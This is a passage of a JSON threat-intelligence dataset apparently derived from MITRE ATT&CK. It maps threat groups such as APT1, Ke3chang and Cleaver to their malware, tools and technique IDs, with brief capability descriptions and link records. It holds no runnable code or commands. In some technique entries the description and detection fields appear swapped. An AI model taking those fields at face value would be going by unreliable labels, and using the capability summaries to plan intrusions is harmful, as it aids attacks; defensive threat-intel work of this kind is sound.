            "id": "G0006",
            "type": "group",
            "attributes": {
                "val": 17,
                "name": "APT1",
                "aliases": [
                    "Comment Crew",
                    "Comment Group",
                    "Comment Panda"
                ],
                "description": "APT1 is a Chinese threat group that has been attributed to the 2nd Bureau of the People’s Liberation Army (PLA) General Staff Department’s (GSD) 3rd Department, commonly known by its Military Unit Cover Designator (MUCD) as Unit 61398.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0345": "Seasalt",
                    "S0123": "xCmd",
                    "S0122": "Pass-The-Hash Toolkit",
                    "S0121": "Lslsass",
                    "S0119": "Cachedump",
                    "S0109": "WEBC2",
                    "S0100": "ipconfig",
                    "S0057": "Tasklist",
                    "S0039": "Net",
                    "S0029": "PsExec",
                    "S0026": "GLOOXMAIL",
                    "S0025": "CALENDAR",
                    "S0017": "BISCUIT",
                    "S0012": "PoisonIvy",
                    "S0008": "gsecdump",
                    "S0006": "pwdump",
                    "S0002": "Mimikatz"
                },
                "techniques": {
                    "T1588.001": "Malware",
                    "T1585.002": "Email Accounts",
                    "T1584.001": "Domains",
                    "T1583.001": "Domains",
                    "T1059.003": "Windows Command Shell",
                    "T1566.002": "Spearphishing Link",
                    "T1566.001": "Spearphishing Attachment",
                    "T1087.001": "Local Account",
                    "T1560.001": "Archive via Utility",
                    "T1114.002": "Remote Email Collection",
                    "T1114.001": "Local Email Collection",
                    "T1003.001": "LSASS Memory",
                    "T1021.001": "Remote Desktop Protocol",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1550.002": "Pass the Hash",
                    "T1135": "Network Share Discovery",
                    "T1119": "Automated Collection",
                    "T1057": "Process Discovery",
                    "T1049": "System Network Connections Discovery",
                    "T1016": "System Network Configuration Discovery",
                    "T1007": "System Service Discovery",
                    "T1005": "Data from Local System",
                    "T1346": "Obtain/re-use payloads",
                    "T1330": "Acquire and/or use 3rd party software services",
                    "T1312": "Compromise 3rd party infrastructure to support delivery",
                    "T1333": "Dynamic DNS",
                    "T1326": "Domain registration hijacking"
                }
            }
        },
        {
            "id": "S0345",
            "type": "tool",
            "attributes": {
                "name": "Seasalt",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Seasalt is malware that has been linked to APT1's 2010 operations. It shares some code similarities with OceanSalt.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1059.003": "Windows Command Shell",
                    "T1036.004": "Masquerade Task or Service",
                    "T1070.004": "File Deletion",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1543.003": "Windows Service",
                    "T1105": "Ingress Tool Transfer",
                    "T1094": "Custom Command and Control Protocol",
                    "T1083": "File and Directory Discovery",
                    "T1057": "Process Discovery",
                    "T1027": "Obfuscated Files or Information"
                }
            },
            "val": 11
        },
        {
            "id": "S0123",
            "type": "tool",
            "attributes": {
                "name": "xCmd",
                "aliases": [],
                "labels": [
                    "tool"
                ],
                "description": "xCmd is an open source tool that is similar to PsExec and allows the user to execute applications on remote systems.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1569.002": "Service Execution"
                }
            },
            "val": 1
        },
        {
            "id": "S0122",
            "type": "tool",
            "attributes": {
                "name": "Pass-The-Hash Toolkit",
                "aliases": [],
                "labels": [
                    "tool"
                ],
                "description": "Pass-The-Hash Toolkit is a toolkit that allows an adversary to \"pass\" a password hash (without knowing the original password) to log in to systems.",
                "platforms": [
                    "Linux",
                    "Windows",
                    "macOS"
                ],
                "techniques": {
                    "T1550.002": "Pass the Hash"
                }
            },
            "val": 1
        },
        {
            "id": "S0121",
            "type": "tool",
            "attributes": {
                "name": "Lslsass",
                "aliases": [],
                "labels": [
                    "tool"
                ],
                "description": "Lslsass is a publicly-available tool that can dump active logon session password hashes from the lsass process.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1003.001": "LSASS Memory"
                }
            },
            "val": 1
        },
        {
            "id": "S0119",
            "type": "tool",
            "attributes": {
                "name": "Cachedump",
                "aliases": [],
                "labels": [
                    "tool"
                ],
                "description": "Cachedump is a publicly-available tool that program extracts cached password hashes from a system’s registry.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1003.005": "Cached Domain Credentials"
                }
            },
            "val": 1
        },
        {
            "id": "S0109",
            "type": "tool",
            "attributes": {
                "name": "WEBC2",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "WEBC2 is a family of backdoor malware used by APT1 as early as July 2006. WEBC2 backdoors are designed to retrieve a webpage, with commands hidden in HTML comments or special tags, from a predetermined C2 server.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1574.001": "DLL Search Order Hijacking",
                    "T1059.003": "Windows Command Shell",
                    "T1105": "Ingress Tool Transfer"
                }
            },
            "val": 3
        },
        {
            "id": "S0026",
            "type": "tool",
            "attributes": {
                "name": "GLOOXMAIL",
                "aliases": [
                    "Trojan.GTALK"
                ],
                "labels": [
                    "malware"
                ],
                "description": "GLOOXMAIL is malware used by APT1 that mimics legitimate Jabber/XMPP traffic.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1102.002": "Bidirectional Communication"
                }
            },
            "val": 1
        },
        {
            "id": "S0025",
            "type": "tool",
            "attributes": {
                "name": "CALENDAR",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "CALENDAR is malware used by APT1 that mimics legitimate Gmail Calendar traffic.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1102.002": "Bidirectional Communication",
                    "T1059.003": "Windows Command Shell"
                }
            },
            "val": 2
        },
        {
            "id": "S0017",
            "type": "tool",
            "attributes": {
                "name": "BISCUIT",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "BISCUIT is a backdoor that has been used by APT1 since as early as 2007.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.002": "Asymmetric Cryptography",
                    "T1059.003": "Windows Command Shell",
                    "T1056.001": "Keylogging",
                    "T1113": "Screen Capture",
                    "T1105": "Ingress Tool Transfer",
                    "T1094": "Custom Command and Control Protocol",
                    "T1082": "System Information Discovery",
                    "T1057": "Process Discovery",
                    "T1033": "System Owner/User Discovery",
                    "T1008": "Fallback Channels"
                }
            },
            "val": 10
        },
        {
            "id": "G0005",
            "type": "group",
            "attributes": {
                "val": 3,
                "name": "APT12",
                "aliases": [
                    "IXESHE",
                    "DynCalc",
                    "Numbered Panda",
                    "DNSCALC"
                ],
                "description": "APT12 is a threat group that has been attributed to China. The group has targeted a variety of victims including but not limited to media outlets, high-tech companies, and multiple governments.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0040": "HTRAN",
                    "S0015": "Ixeshe",
                    "S0003": "RIPTIDE"
                },
                "techniques": {
                    "T1102.002": "Bidirectional Communication",
                    "T1568.003": "DNS Calculation",
                    "T1204.002": "Malicious File",
                    "T1566.001": "Spearphishing Attachment",
                    "T1203": "Exploitation for Client Execution"
                }
            }
        },
        {
            "id": "S0015",
            "type": "tool",
            "attributes": {
                "name": "Ixeshe",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Ixeshe is a malware family that has been used since at least 2009 against targets in East Asia.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1132.001": "Standard Encoding",
                    "T1059.003": "Windows Command Shell",
                    "T1564.001": "Hidden Files and Directories",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1070.004": "File Deletion",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1105": "Ingress Tool Transfer",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1057": "Process Discovery",
                    "T1043": "Commonly Used Port",
                    "T1033": "System Owner/User Discovery",
                    "T1016": "System Network Configuration Discovery",
                    "T1007": "System Service Discovery",
                    "T1005": "Data from Local System"
                }
            },
            "val": 16
        },
        {
            "id": "S0003",
            "type": "tool",
            "attributes": {
                "name": "RIPTIDE",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "RIPTIDE is a proxy-aware backdoor used by APT12.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.001": "Symmetric Cryptography",
                    "T1071.001": "Web Protocols",
                    "T1043": "Commonly Used Port"
                }
            },
            "val": 3
        },
        {
            "id": "G0004",
            "type": "group",
            "attributes": {
                "val": 10,
                "name": "Ke3chang",
                "aliases": [
                    "APT15",
                    "Mirage",
                    "Vixen Panda",
                    "GREF",
                    "Playful Dragon",
                    "RoyalAPT"
                ],
                "description": "Ke3chang is a threat group attributed to actors operating out of China. Ke3chang has targeted several industries, including oil, government, military, and more.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0439": "Okrum",
                    "S0280": "MirageFox",
                    "S0227": "spwebmember",
                    "S0104": "netstat",
                    "S0100": "ipconfig",
                    "S0097": "Ping",
                    "S0096": "Systeminfo",
                    "S0057": "Tasklist",
                    "S0039": "Net",
                    "S0002": "Mimikatz"
                },
                "techniques": {
                    "T1071.004": "DNS",
                    "T1071.001": "Web Protocols",
                    "T1569.002": "Service Execution",
                    "T1059.003": "Windows Command Shell",
                    "T1069.002": "Domain Groups",
                    "T1087.002": "Domain Account",
                    "T1087.001": "Local Account",
                    "T1003.004": "LSA Secrets",
                    "T1560.001": "Archive via Utility",
                    "T1560": "Archive Collected Data",
                    "T1114.002": "Remote Email Collection",
                    "T1213.002": "Sharepoint",
                    "T1558.001": "Golden Ticket",
                    "T1056.001": "Keylogging",
                    "T1003.002": "Security Account Manager",
                    "T1003.001": "LSASS Memory",
                    "T1021.002": "SMB/Windows Admin Shares",
                    "T1036.002": "Right-to-Left Override",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1543.003": "Windows Service",
                    "T1133": "External Remote Services",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1059": "Command and Scripting Interpreter",
                    "T1057": "Process Discovery",
                    "T1049": "System Network Connections Discovery",
                    "T1041": "Exfiltration Over C2 Channel",
                    "T1018": "Remote System Discovery",
                    "T1016": "System Network Configuration Discovery",
                    "T1007": "System Service Discovery",
                    "T1005": "Data from Local System"
                }
            }
        },
        {
            "id": "S0439",
            "type": "tool",
            "attributes": {
                "name": "Okrum",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Okrum is a Windows backdoor that has been seen in use since December 2016 with strong links to Ke3chang.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.001": "Symmetric Cryptography",
                    "T1071.001": "Web Protocols",
                    "T1001.003": "Protocol Impersonation",
                    "T1132.001": "Standard Encoding",
                    "T1090.002": "External Proxy",
                    "T1569.002": "Service Execution",
                    "T1059.003": "Windows Command Shell",
                    "T1497.003": "Time Based Evasion",
                    "T1497.002": "User Activity Based Checks",
                    "T1497.001": "System Checks",
                    "T1564.001": "Hidden Files and Directories",
                    "T1003.005": "Cached Domain Credentials",
                    "T1560.003": "Archive via Custom Method",
                    "T1560.001": "Archive via Utility",
                    "T1134.001": "Token Impersonation/Theft",
                    "T1056.001": "Keylogging",
                    "T1003.001": "LSASS Memory",
                    "T1036.004": "Masquerade Task or Service",
                    "T1027.003": "Steganography",
                    "T1070.004": "File Deletion",
                    "T1547.009": "Shortcut Modification",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1543.003": "Windows Service",
                    "T1053.005": "Scheduled Task",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1124": "System Time Discovery",
                    "T1105": "Ingress Tool Transfer",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1049": "System Network Connections Discovery",
                    "T1041": "Exfiltration Over C2 Channel",
                    "T1033": "System Owner/User Discovery",
                    "T1016": "System Network Configuration Discovery"
                }
            },
            "val": 33
        },
        {
            "id": "S0280",
            "type": "tool",
            "attributes": {
                "name": "MirageFox",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "MirageFox is a remote access tool used against Windows systems. It appears to be an upgraded version of a tool known as Mirage, which is a RAT believed to originate in 2012.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1574.001": "DLL Search Order Hijacking",
                    "T1059.003": "Windows Command Shell",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1082": "System Information Discovery",
                    "T1043": "Commonly Used Port",
                    "T1033": "System Owner/User Discovery"
                }
            },
            "val": 6
        },
        {
            "id": "T1213.002",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Sharepoint",
                "chain_phase": "collection",
                "description": "The user access logging within Microsoft's SharePoint can be configured to report access to certain pages and documents. (Citation: Microsoft SharePoint Logging). As information repositories generally have a considerably large user base, detection of malicious use can be non-trivial. At minimum, access to information repositories performed by privileged users (for example, Active Directory Domain, Enterprise, or Schema Administrators) should be closely monitored and alerted upon, as these types of accounts should not generally used to access information repositories. If the capability exists, it may be of value to monitor and alert on users that are retrieving and viewing a large number of documents and pages; this behavior may be indicative of programmatic means being used to retrieve all data within the repository. In environments with high-maturity, it may be possible to leverage User-Behavioral Analytics (UBA) platforms to detect and alert on user based anomalies. \n\n",
                "detection": "Adversaries may leverage the SharePoint repository as a source to mine valuable information. SharePoint will often contain useful information for an adversary to learn about the structure and functionality of the internal network and systems. For example, the following is a list of example information that may hold potential value to an adversary and may also be found on SharePoint:\n\n* Policies, procedures, and standards\n* Physical / logical network diagrams\n* System architecture diagrams\n* Technical system documentation\n* Testing / development credentials\n* Work / project schedules\n* Source code snippets\n* Links to network shares and other internal resources",
                "is_subtype": true,
                "platforms": [
                    "Windows",
                    "Office 365"
                ]
            }
        },
        {
            "id": "S0227",
            "type": "tool",
            "attributes": {
                "name": "spwebmember",
                "aliases": [],
                "labels": [
                    "tool"
                ],
                "description": "spwebmember is a Microsoft SharePoint enumeration and data dumping tool written in .NET.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1213.002": "Sharepoint"
                }
            },
            "val": 1
        },
        {
            "id": "G0003",
            "type": "group",
            "attributes": {
                "val": 4,
                "name": "Cleaver",
                "aliases": [
                    "Threat Group 2889",
                    "TG-2889"
                ],
                "description": "Cleaver is a threat group that has been attributed to Iranian actors and is responsible for activity tracked as Operation Cleaver.  Strong circumstantial evidence suggests Cleaver is linked to Threat Group 2889 (TG-2889).",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0056": "Net Crawler",
                    "S0029": "PsExec",
                    "S0004": "TinyZBot",
                    "S0002": "Mimikatz"
                },
                "techniques": {
                    "T1557.002": "ARP Cache Poisoning",
                    "T1587.001": "Malware",
                    "T1585.001": "Social Media Accounts",
                    "T1003.001": "LSASS Memory",
                    "T1345": "Create custom payloads",
                    "T1341": "Build social network persona",
                    "T1313": "Obfuscation or cryptography",
                    "T1342": "Develop social network persona digital footprint"
                }
            }
        },
        {
            "id": "T1110.002",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Password Cracking",
                "chain_phase": "credential-access",
                "description": "It is difficult to detect when hashes are cracked, since this is generally done outside the scope of the target network. Consider focusing efforts on detecting other adversary behavior used to acquire credential materials, such as [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) or [Kerberoasting](https://attack.mitre.org/techniques/T1558/003).",
                "detection": "Adversaries may use password cracking to attempt to recover usable credentials, such as plaintext passwords, when credential material such as password hashes are obtained. OS Credential Dumping is used to obtain password hashes, this may only get an adversary so far when Pass the Hash is not an option. Techniques to systematically guess the passwords used to compute hashes are available, or the adversary may use a pre-computed rainbow table to crack hashes. Cracking hashes is usually done on adversary-controlled systems outside of the target network. The resulting plaintext password resulting from a successfully cracked hash may be used to log into systems, resources, and services in which the account has access.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows",
                    "Office 365",
                    "Azure AD"
                ]
            }
        },
        {
            "id": "S0056",
            "type": "tool",
            "attributes": {
                "name": "Net Crawler",
                "aliases": [
                    "NetC"
                ],
                "labels": [
                    "malware"
                ],
                "description": "Net Crawler is an intranet worm capable of extracting credentials using credential dumpers and spreading to systems on a network over SMB by brute forcing accounts with recovered passwords and using PsExec to execute a copy of Net Crawler.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1569.002": "Service Execution",
                    "T1003.001": "LSASS Memory",
                    "T1110.002": "Password Cracking",
                    "T1021.002": "SMB/Windows Admin Shares"
                }
            },
            "val": 4
        },
        {
            "id": "S0004",
            "type": "tool",
            "attributes": {
                "name": "TinyZBot",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "TinyZBot is a bot written in C# that was developed by Cleaver.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1059.003": "Windows Command Shell",
                    "T1562.001": "Disable or Modify Tools",
                    "T1056.001": "Keylogging",
                    "T1547.009": "Shortcut Modification",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1543.003": "Windows Service",
                    "T1115": "Clipboard Data",
                    "T1113": "Screen Capture"
                }
            },
            "val": 8
        },
        {
            "id": "G0002",
            "type": "group",
            "attributes": {
                "val": 1,
                "name": "Moafee",
                "aliases": [],
                "description": "Moafee is a threat group that appears to operate from the Guandong Province of China. Due to overlapping TTPs, including similar custom tools, Moafee is thought to have a direct or indirect relationship with the threat group DragonOK.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0012": "PoisonIvy"
                },
                "techniques": {
                    "T1027.001": "Binary Padding"
                }
            }
        },
        {
            "id": "G0001",
            "type": "group",
            "attributes": {
                "val": 4,
                "name": "Axiom",
                "aliases": [
                    "Group 72"
                ],
                "description": "Axiom is a cyber espionage group suspected to be associated with the Chinese government. It is responsible for the Operation SMN campaign.  Though both this group and Winnti Group use the malware Winnti for Windows, the two groups appear to be distinct based on differences in reporting on the groups' TTPs and targeting.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0412": "ZxShell",
                    "S0203": "Hydraq",
                    "S0021": "Derusbi",
                    "S0009": "Hikit"
                },
                "techniques": {
                    "T1001.002": "Steganography",
                    "T1021.001": "Remote Desktop Protocol",
                    "T1546.008": "Accessibility Features",
                    "T1190": "Exploit Public-Facing Application",
                    "T1003": "OS Credential Dumping",
                    "T1001": "Data Obfuscation"
                }
            }
        },
        {
            "id": "S0009",
            "type": "tool",
            "attributes": {
                "name": "Hikit",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Hikit is malware that has been used by Axiom for late-stage persistence and exfiltration after the initial compromise.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1553.006": "Code Signing Policy Modification",
                    "T1573.001": "Symmetric Cryptography",
                    "T1071.001": "Web Protocols",
                    "T1090.001": "Internal Proxy",
                    "T1574.001": "DLL Search Order Hijacking",
                    "T1059.003": "Windows Command Shell",
                    "T1553.004": "Install Root Certificate",
                    "T1014": "Rootkit"
                }
            },
            "val": 8
        },
        {
            "id": "G0097",
            "type": "group",
            "attributes": {
                "val": 1,
                "name": "Bouncing Golf",
                "aliases": [],
                "description": "Bouncing Golf is a cyberespionage campaign targeting Middle Eastern countries.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0421": "GolfSpy"
                },
                "techniques": {
                    "T1476": "Deliver Malicious App via Other Means",
                    "T1444": "Masquerade as Legitimate Application"
                }
            }
        },
        {
            "id": "T1532",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Data Encrypted",
                "chain_phase": "exfiltration",
                "description": "Many encryption mechanisms are built into standard application-accessible APIs, and are therefore undetectable to the end user.",
                "detection": "Data is encrypted before being exfiltrated in order to hide the information that is being exfiltrated from detection or to make the exfiltration less conspicuous upon inspection by a defender. The encryption is performed by a utility, programming library, or custom algorithm on the data itself and is considered separate from any encryption performed by the command and control or file transfer protocol. Common file formats that can encrypt files are RAR and zip.",
                "is_subtype": false,
                "platforms": [
                    "Android",
                    "iOS"
                ]
            }
        },
        {
            "id": "T1513",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Screen Capture",
                "chain_phase": "collection",
                "description": "The user can view a list of apps with accessibility service privileges in the device settings.",
                "detection": "Adversaries may use screen captures to collect information about applications running in the foreground, capture user data, credentials, or other sensitive information. Applications running in the background can capture screenshots or videos of another application running in the foreground by using the Android `MediaProjectionManager` (generally requires the device user to grant consent). Background applications can also use Android accessibility services to capture screen contents being displayed by a foreground application. An adversary with root access or Android Debug Bridge (adb) access could call the Android `screencap` or `screenrecord` commands.",
                "is_subtype": false,
                "platforms": [
                    "Android"
                ]
            }
        },
        {
            "id": "T1424",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Process Discovery",
                "chain_phase": "discovery",
                "description": [],
                "detection": "On Android versions prior to 5, applications can observe information about other processes that are running through methods in the ActivityManager class. On Android versions prior to 7, applications can obtain this information by executing the <code>ps</code> command, or by examining the <code>/proc</code> directory. Starting in Android version 7, use of the Linux kernel's <code>hidepid</code> feature prevents applications (without escalated privileges) from accessing this information .",
                "is_subtype": false,
                "platforms": [
                    "Android"
                ]
            }
        },
        {
            "id": "T1402",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Broadcast Receivers",
                "chain_phase": "persistence",
                "description": "Broadcast intent receivers are part of standard OS-level APIs and are therefore typically undetectable to the end user.",
                "detection": "An intent is a message passed between Android application or system components. Applications can register to receive broadcast intents at runtime, which are system-wide intents delivered to each app when certain events happen on the device, such as network changes or the user unlocking the screen. Malicious applications can then trigger certain actions within the app based on which broadcast intent was received.\n\nFurther, malicious applications can register for intents broadcasted by other applications in addition to the Android system itself. This allows the malware to respond based on actions in other applications. This behavior typically indicates a more intimate knowledge, or potentially the targeting of specific devices, users, or applications.\n\nIn Android 8 (API level 26), broadcast intent behavior was changed, limiting the implicit intents that applications can register for in the manifest. In most cases, applications that register through the manifest will no longer receive the broadcasts. Now, applications must register context-specific broadcast receivers while the user is actively using the app.",
                "is_subtype": false,
                "platforms": [
                    "Android"
                ]
            }
        },
        {
            "id": "T1414",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Capture Clipboard Data",
                "chain_phase": "collection",
                "description": "Capturing clipboard content can be difficult to detect, and therefore enterprises may be better served focusing on detection at other stages of adversarial behavior.",
                "detection": "Adversaries may abuse Clipboard Manager APIs to obtain sensitive information copied to the global clipboard. For example, passwords being copy-and-pasted from a password manager app could be captured by another application installed on the device.\n\nOn Android, <code>ClipboardManager.OnPrimaryClipChangedListener</code> can be used by applications to register as a listener and monitor the clipboard for changes.\n\nAndroid 10 mitigates this technique by preventing applications from accessing clipboard data unless the application is on the foreground or is set as the device’s default input method editor (IME).",
                "is_subtype": false,
                "platforms": [
                    "Android",
                    "iOS"
                ]
            }
        },
        {
            "id": "S0421",
            "type": "tool",
            "attributes": {
                "name": "GolfSpy",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "GolfSpy is Android spyware deployed by the group Bouncing Golf.",
                "platforms": [
                    "Android"
                ],
                "techniques": {
                    "T1533": "Data from Local System",
                    "T1532": "Data Encrypted",
                    "T1512": "Capture Camera",
                    "T1513": "Screen Capture",
                    "T1476": "Deliver Malicious App via Other Means",
                    "T1424": "Process Discovery",
                    "T1437": "Standard Application Layer Protocol",
                    "T1406": "Obfuscated Files or Information",
                    "T1447": "Delete Device Data",
                    "T1402": "Broadcast Receivers",
                    "T1418": "Application Discovery",
                    "T1414": "Capture Clipboard Data",
                    "T1426": "System Information Discovery",
                    "T1412": "Capture SMS Messages",
                    "T1429": "Capture Audio",
                    "T1430": "Location Tracking",
                    "T1432": "Access Contact List",
                    "T1433": "Access Call Log"
                }
            },
            "val": 18
        },
        {
            "id": "G1001",
            "type": "group",
            "attributes": {
                "val": 0,
                "name": "HEXANE",
                "aliases": [
                    "Lyceum"
                ],
                "description": "HEXANE is a threat group that has targeted ICS organization within the oil & gas, and telecommunications sectors. Many of the targeted organizations have been located in the Middle East including Kuwait. HEXANE's targeting of telecommunications has been speculated to be part of an effort to establish man-in-the-middle capabilities throughout the region. HEXANE's TTPs appear similar to APT33 and OilRig but due to differences in victims and tools it is tracked as a separate entity.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": [],
                "techniques": {
                    "T0830": "Man in the Middle",
                    "T0853": "Scripting",
                    "T0869": "Standard Application Layer Protocol",
                    "T0859": "Valid Accounts",
                    "T0865": "Spearphishing Attachment"
                }
            }
        },
        {
            "id": "G1000",
            "type": "group",
            "attributes": {
                "val": 0,
                "name": "ALLANITE",
                "aliases": [
                    "Palmetto Fusion"
                ],
                "description": "ALLANITE is a suspected Russian cyber espionage group, that has primarily targeted the electric utility sector within the United States and United Kingdom. The group's tactics and techniques are reportedly similar to Dragonfly / Dragonfly 2.0, although ALLANITE’s technical capabilities have not exhibited disruptive or destructive abilities. It has been suggested that the group maintains a presence in ICS for the purpose of gaining understanding of processes and to maintain persistence.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": [],
                "techniques": {
                    "T0859": "Valid Accounts",
                    "T0865": "Spearphishing Attachment",
                    "T0817": "Drive-by Compromise",
                    "T0852": "Screen Capture"
                }
            }
        }
    ],
    "links": [
        {
            "source": "S0225",
            "target": "T1190"
        },
        {
            "source": "G0130",
            "target": "S0225"
        },
        {
            "source": "S0224",
            "target": "T1190"
        },
        {
            "source": "G0130",
            "target": "S0224"
        },
        {
            "source": "S0590",
            "target": "T1046"
        },
        {
            "source": "S0590",
            "target": "T1040"
        },
        {
            "source": "S0590",
            "target": "T1033"
        },
        {
            "source": "S0590",
            "target": "T1018"
        },
        {
            "source": "S0590",
            "target": "T1016"
        },
        {
            "source": "G0129",
            "target": "S0590"
        },
        {
            "source": "S0154",
            "target": "T1059.007"
        },
        {
            "source": "S0154",
            "target": "T1027.005"
        },
        {
            "source": "S0154",
            "target": "T1573.002"
        },
        {
            "source": "S0154",
            "target": "T1573.001"
        },
        {
            "source": "S0154",
            "target": "T1071.004"
        },
        {
            "source": "S0154",
            "target": "T1071.001"
        },
        {
            "source": "S0154",
            "target": "T1572"
        },
        {
            "source": "S0154",
            "target": "T1090.001"
        },
        {
            "source": "S0154",
            "target": "T1078.003"
        },
        {
            "source": "S0154",
            "target": "T1078.002"
        },
        {
            "source": "S0154",
            "target": "T1569.002"
        },
        {
            "source": "S0154",
            "target": "T1059.006"
        },
        {
            "source": "S0154",
            "target": "T1059.005"
        },
        {
            "source": "S0154",
            "target": "T1059.003"
        },
        {
            "source": "S0154",
            "target": "T1059.001"
        },
        {
            "source": "S0154",
            "target": "T1087.002"
        },
        {
            "source": "S0154",
            "target": "T1562.001"
        },
        {
            "source": "S0154",
            "target": "T1134.004"
        },
        {
            "source": "S0154",
            "target": "T1134.003"
        },
        {
            "source": "S0154",
            "target": "T1134.001"
        },
        {
            "source": "S0154",
            "target": "T1056.001"
        },
        {
            "source": "S0154",
            "target": "T1003.002"
        },
        {
            "source": "S0154",
            "target": "T1021.006"
        },
        {
            "source": "S0154",
            "target": "T1021.004"
        },
        {
            "source": "S0154",
            "target": "T1021.003"
        },
        {
            "source": "S0154",
            "target": "T1021.002"
        },
        {
            "source": "S0154",
            "target": "T1021.001"
        },
        {
            "source": "S0154",
            "target": "T1553.002"
        },
        {
            "source": "S0154",
            "target": "T1070.006"
        },
        {
            "source": "S0154",
            "target": "T1550.002"
        },
        {
            "source": "S0154",
            "target": "T1548.002"
        },
        {
            "source": "S0154",
            "target": "T1543.003"
        },
        {
            "source": "S0154",
            "target": "T1055.012"
        },
        {
            "source": "S0154",
            "target": "T1055.001"
        },
        {
            "source": "S0154",
            "target": "T1137.001"
        },
        {
            "source": "S0154",
            "target": "T1197"
        },
        {
            "source": "S0154",
            "target": "T1203"
        },
        {
            "source": "S0154",
            "target": "T1185"
        },
        {
            "source": "S0154",
            "target": "T1140"
        },
        {
            "source": "S0154",
            "target": "T1135"
        },
        {
            "source": "S0154",
            "target": "T1113"
        },
        {
            "source": "S0154",
            "target": "T1112"
        },
        {
            "source": "S0154",
            "target": "T1106"
        },
        {
            "source": "S0154",
            "target": "T1105"
        },
        {
            "source": "S0154",
            "target": "T1095"
        },
        {
            "source": "S0154",
            "target": "T1071"
        },
        {
            "source": "S0154",
            "target": "T1068"
        },
        {
            "source": "S0154",
            "target": "T1057"
        },
        {
            "source": "S0154",
            "target": "T1055"
        },
        {
            "source": "S0154",
            "target": "T1049"
        },
        {
            "source": "S0154",
            "target": "T1047"
        },
        {
            "source": "S0154",
            "target": "T1046"
        },
        {
            "source": "S0154",
            "target": "T1043"
        },
        {
            "source": "S0154",
            "target": "T1029"
        },
        {
            "source": "S0154",
            "target": "T1027"
        },
        {
            "source": "S0154",
            "target": "T1026"
        },
        {
            "source": "S0154",
            "target": "T1018"
        },
        {
            "source": "S0154",
            "target": "T1016"
        },
        {
            "source": "S0154",
            "target": "T1012"
        },
        {
            "source": "S0154",
            "target": "T1005"
        },
        {
            "source": "G0129",
            "target": "S0154"
        },
        {
            "source": "S0013",
            "target": "T1127.001"
        },
        {
            "source": "S0013",
            "target": "T1071.004"
        },
        {
            "source": "S0013",
            "target": "T1071.001"
        },
        {
            "source": "S0013",
            "target": "T1102.001"
        },
        {
            "source": "S0013",
            "target": "T1574.002"
        },
        {
            "source": "S0013",
            "target": "T1059.003"
        },
        {
            "source": "S0013",
            "target": "T1497.001"
        },
        {
            "source": "S0013",
            "target": "T1056.001"
        },
        {
            "source": "S0013",
            "target": "T1036.004"
        },
        {
            "source": "S0013",
            "target": "T1547.001"
        },
        {
            "source": "S0013",
            "target": "T1543.003"
        },
        {
            "source": "S0013",
            "target": "T1140"
        },
        {
            "source": "S0013",
            "target": "T1135"
        },
        {
            "source": "S0013",
            "target": "T1113"
        },
        {
            "source": "S0013",
            "target": "T1112"
        },
        {
